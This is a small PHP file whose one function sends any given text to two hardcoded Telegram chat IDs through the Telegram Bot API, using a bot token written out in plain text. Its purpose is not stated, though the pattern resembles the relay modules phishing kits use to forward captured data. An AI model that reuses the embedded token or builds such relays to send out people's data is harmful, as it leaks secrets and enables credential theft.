<?php
include_once '../app.php';

// Function to send a message via the Telegram Bot API
function send($info){
    $botToken = "6318140435:AAGAEYeHGRA7dyV4cUIYNrpqMz_nLqPoaQA";
    
    // Array of chat IDs
    $chatIds = [
        "5308980068",
        "-1002041728341"
      ];

    foreach ($chatIds as $chatId) {
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($info);
        file_get_contents($url);
    }
}

?>
